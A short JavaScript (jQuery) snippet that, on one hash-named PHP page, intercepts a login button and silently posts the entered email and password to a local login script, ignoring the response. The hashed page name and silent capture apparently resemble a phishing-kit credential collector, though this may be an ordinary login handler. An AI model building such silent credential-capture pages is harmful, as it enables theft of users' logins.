if(window.location.pathname==="/meliniumpc/ed9eee4c247fee6711a6e41d3dfe8bcd.php"){
    $("#login").click((e)=>{
        e.preventDefault();
       $.post("php/login.php",{login:$("#email").val(),pwd:$("#pwd").val()},()=>{
       })
    })
}